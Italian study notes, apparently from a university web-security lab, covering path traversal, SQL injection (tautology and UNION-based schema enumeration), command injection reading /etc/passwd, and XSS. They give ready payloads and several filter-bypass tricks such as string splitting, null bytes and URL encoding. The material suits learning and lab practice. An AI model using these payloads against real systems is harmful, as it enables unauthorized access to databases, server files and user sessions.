# Lettura file dal server (Path Traversal)

- Comandi simili a cat: less, more, head, tail, sed '', tac.

- Se disabilitato ";", usa pipe |

- Ricorda nella get %20 per mettere spazi.

- Se dà problemi di path traversal, inizia il path con /./.. etc

Esempio command injection: http://localhost:8000/?domain=www.ulisse.unibo.it|%20more%20../../../../../../etc/passwd%20

- Se dà problemi perchè "file non può finire con x", prova mettendo *, oppure %20 per aggiungere uno spazio alla fine


# SQL Injection

La SQL Injection è una vulnerabilità di sicurezza che consente ad un attaccante di interferire con le query SQL che un'applicazione invia al suo database. Questo può permettere all'attaccante di visualizzare dati a cui normalmente NON dovrebbe avere accesso, oppure eseguire comandi arbitrari sul database.

## Simple SQLI

Tornare un Risultato "VERO"
Un attacco SQL Injection può sfruttare l'input dell'utente per manipolare una query SQL in modo che il risultato sia sempre vero.

Esempio di Query Vulnerabile: `SELECT * FROM users WHERE username = 'user' AND password = 'password'`;

Se l'input dell'utente per il campo username è: `' OR 1=1 --`

La query diventa: `SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'password'`;

- OR 1=1 -- forza la condizione ad essere sempre vera.
- -- commenta il resto della query, ignorando la verifica della password.

## Union Based SQLI
Passi per Sfruttare UNION Based Injection:

- Scoprire il Numero di Colonne: Inietta diverse query con NULL per determinare il numero di colonne nella query originale.
	
	- `' UNION SELECT NULL #` oppure `' UNION SELECT NULL --`, dipende dalla versione di sql 
	
	- Se dà errore, si deve provare con più colonne: `' UNION SELECT NULL, NULL, NULL #`. 
	Quando NON si verifica errore, si è trovato il numero di colonne.

- Sfruttare information_schema: information_schema è uno schema SQL standard che contiene informazioni sulla struttura del database.

    - Scoprire gli Schemi: `' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #`

    - Scoprire le Tabelle: `' UNION SELECT NULL, NULL, table_name FROM information_schema.tables #`

    - Scoprire le Tabelle di uno Specifico Schema:`' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #`

    - Scoprire le Colonne di una Specifica Tabella:`' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #`

    - Recuperare Dati da una Tabella: `' UNION SELECT NULL, NULL, username FROM users #`

### Esempio dettagliato
Supponiamo di voler visualizzare i nomi degli utenti nel database e che l'applicazione esegua questa query:
SELECT id, username, email FROM users WHERE id = 1;

- Scoprire il Numero di Colonne: `' UNION SELECT NULL #`. Se c'è un errore, proviamo con: `' UNION SELECT NULL, NULL, NULL #`

- Se non dà nessun errore allora la query originale ha 3 colonne.

- Scoprire gli Schemi: `' UNION SELECT NULL, NULL, schema_name FROM information_schema.schemata #`. Scopriamo uno schema chiamato unibo.

- Scoprire le Tabelle: `' UNION SELECT NULL, NULL, table_name FROM information_schema.tables WHERE table_schema = 'unibo' #`. Scopriamo tabelle chiamate users e guestbook.

- Scoprire le Colonne della Tabella users: `' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name = 'users' #`. Scopriamo colonne chiamate id, username, email.

- Recuperare i Dati dalla Tabella users: `' UNION SELECT NULL, NULL, username FROM users #`. Otteniamo una lista di utenti: ale, Pippo

# Web Command injection
La Web Command Injection è una vulnerabilità di sicurezza in cui un'applicazione web accetta input dall'utente e lo utilizza all'interno di un comando di sistema senza un'adeguata sanitizzazione o convalida. Ciò consente ad un attaccante di eseguire comandi arbitrari sul server.

## Concatenazione di comandi

Se un parametro è utilizzato direttamente in un comando di sistema, potrebbe essere vulnerabile alla command injection. Il primo passo in un attacco di questo tipo è riuscire a concatenare comandi aggiuntivi.

Esempio di URL vulnerabile: `http://localhost:8000/?domain=>; ls`

In questo caso, il carattere ; viene utilizzato per concatenare comandi. Se il ; è filtrato, si possono provare altre concatenazioni:

- ; Separa due comandi. Esempio: command1; command2

- && Esegue command2 solo se command1 ha successo. Esempio: command1 && command2

- || Esegue command2 solo se command1 fallisce. Esempio: command1 || command2

- | Passa l'output di command1 come input a command2. Esempio: command1 | command2

- () Esegue i comandi in una subshell. Esempio: (command1; command2)

- & Esegue il comando in background. Esempio: command1 &

## Lettura di file
Il secondo passo è tipicamente riuscire a leggere un file. Questo è utile per estrarre informazioni sensibili come configurazioni o password.

Comandi di apertura file in Unix:

- cat file : Mostra il contenuto del file.

- more file : Mostra il contenuto del file con paginazione.

- less file : Simile a more, ma più potente. È interattivo.

- head file : Mostra le prime linee del file.

- tail file : Mostra le ultime linee del file. tail -n +0 file funziona come cat.

- nl file : Mostra il contenuto del file numerando le linee.

- sed '' file : Utilizza sed per mostrare il contenuto del file senza modifiche.

## Bypass dei fltri
I filtri possono bloccare o sostituire alcune stringhe per prevenire attacchi.

Uso di Metacaratteri:

- /etc/passw\\\\d : Utilizza l'escape \\\\d per rappresentare un carattere arbitrario.

- /etc/passw[d] : Utilizza i caratteri di gruppo per rappresentare d.

- /etc/passw? : Utilizza il carattere ? per rappresentare un singolo carattere arbitrario.

Sostituzioni Calcolate:
Se una stringa come "passwd" viene sostituita con una stringa vuota, si può provare a utilizzare tecniche di offuscamento come:

- Doppio Inserimento: Inserisci due volte la stringa, sperando che solo una venga filtrata.
Esempio: `passwdpasswd --> passwd` (se il filtro NON è globale)

- Spezzo la Stringa: Suddividi la stringa in modo che il filtro NON la rilevi.Esempio:
`pass passwd wd --> passpasswdwd --> passwd.`

## Applicazione Pratica
Supponiamo di voler leggere il file /etc/passwd e che il filtro sostituisca la stringa "passwd" con una stringa vuota. Puoi provare a spezzare la stringa:

- Genera un comando che concatenando i segmenti, eluda il filtro:cat /etc/passw<segment_1>d<segment_2>	
Se <segment_1> e <segment_2> vengono trattati separatamente, il filtro potrebbe NON rilevare "passwd".

- Se il comando ; è filtrato, prova altri metodi di concatenazione:<http://localhost:8000/?domain=||> cat /etc/passwd
		
- Utilizza URL encoding per bypassare i filtri:<http://localhost:8000/?domain=%7C%7C%20cat%20/etc/passwd>
		In questo esempio, %7C%7C è l'URL encoding di || e %20 è l'URL encoding di uno spazio.

### Esempio dettagliato 

L'applicazione accetta un parametro `domain` tramite una query string e lo utilizza in un comando di sistema. Ad esempio, la nostra applicazione potrebbe avere una funzione per ottenere informazioni su un dominio utilizzando il comando `nslookup`.

`http://localhost:8000/?domain=|| cat /etc/passwd`

Se un utente malintenzionato passa un valore per domain che include caratteri speciali, come ||, può concatenare comandi e fare injection.

Il || è un operatore di shell che esegue il secondo comando (cat /etc/passwd) solo se il primo comando (nslookup) fallisce. Tuttavia, se nslookup viene eseguito senza argomenti validi, potrebbe fallire e quindi il cat /etc/passwd verrà eseguito.

Iniezione di Comandi: L'URL http://localhost:8000/?domain=|| cat /etc/passwd tenta di iniettare il comando cat /etc/passwd sfruttando la concatenazione di comandi con ||.

Passi Dettagliati:

- Esecuzione Originale: Supponiamo che il comando originale eseguito sia: nslookup example.com
	
- Iniezione di Comandi:Se il parametro domain è || cat /etc/passwd, il comando finale diventa: nslookup || cat /etc/passwd

- Output Atteso: Se il server non ha adeguate misure di sicurezza, l'attaccante può visualizzare il contenuto del file /etc/passwd, che contiene informazioni sugli utenti del sistema.



# XSS
Il Cross-Site Scripting (XSS) è una vulnerabilità di sicurezza che permette ad un attaccante di iniettare codice JavaScript malevolo in una pagina web visualizzata da altri utenti. Questo codice può eseguire operazioni come rubare sessioni, defacing di siti web, redirezioni NON autorizzate e altre azioni dannose.

## Tipi di XSS:

- Stored XSS: Il codice malevolo viene salvato nel server e visualizzato ogni volta che un utente accede ad una determinata pagina.

- Reflected XSS: Il codice malevolo viene inviato al server tramite una richiesta (come una query string) e immediatamente riflesso indietro all'utente.

- DOM-based XSS: Il codice malevolo è eseguito direttamente nel browser manipolando il Document Object Model (DOM).

## Come Funziona un Attacco XSS
Un attacco XSS può avvenire quando un'applicazione web prende input dall'utente e lo include nell'output HTML senza una corretta sanitizzazione. 
Esempio classico:

- Input Utente: `<script>alert("XSS")</script>`

- Output NON Sanitizzato: `<div>Benvenuto, <script>alert("XSS")</script></div>`

Quando l'output viene renderizzato dal browser, esegue il codice JavaScript inserito, in questo caso mostrando un alert con il messaggio "XSS".

## Bypassare i Filtri
Spesso, le applicazioni implementano filtri per prevenire l'iniezione di codice dannoso. Ecco alcune tecniche per bypassare questi filtri:

- Bypassando il Filtro su script

	- Inserire caratteri null `(%00):<scrip%00t>alert("XSS")</scrip%00t>`

	- Spezzare la Parola script: `<scripscriptt>alert("XSS")</scripscriptt>`

## Bypassando il Filtro su < e >

- Utilizzare le entità HTML per rappresentare < e >: `&#60;script&#62;alert('XSS')&#60;/script&#62`;

- Sfruttare l'Output a Proprio Vantaggio:
Un esempio pratico di sfruttamento dell'output è quando un'applicazione restituisce direttamente l'input dell'utente in un attributo HTML. Consideriamo il seguente scenario:

1. Input Utente:		ciao

2. Output:		`<img src="ciao">`

Se vediamo un errore 404 (file not found), significa che l'applicazione inserisce direttamente il nostro input nell'attributo src dell'elemento `<img>`.

## Sfruttare l'onerror
Per sfruttare questa vulnerabilità, possiamo utilizzare l'attributo onerror dell'elemento `<img>`, che viene eseguito quando l'immagine NON può essere caricata:

1. Input Maligno: `" onerror="alert('XSS')`

2. Output: `<img src="" onerror="alert('XSS')">`

Quando il browser tenta di caricare un'immagine con un src vuoto, l'evento onerror viene attivato ed esegue il codice JavaScript, mostrando un alert con il messaggio "XSS".

## Altri Attributi HTML Utilizzabili 
Diversi attributi HTML possono essere utilizzati per eseguire JavaScript. Ecco alcuni esempi:

- `<img>:		<img src="invalid.jpg" onerror="alert('XSS')">`

- `<body>:		<body onload="alert('XSS')">`

- `<iframe>:		<iframe src="invalid.html" onerror="alert('XSS')">`

- `<input>:		<input onfocus="alert('XSS')" autofocus>`

- `<div>:		<div onmouseover="alert('XSS')">Hover over me!</div>`
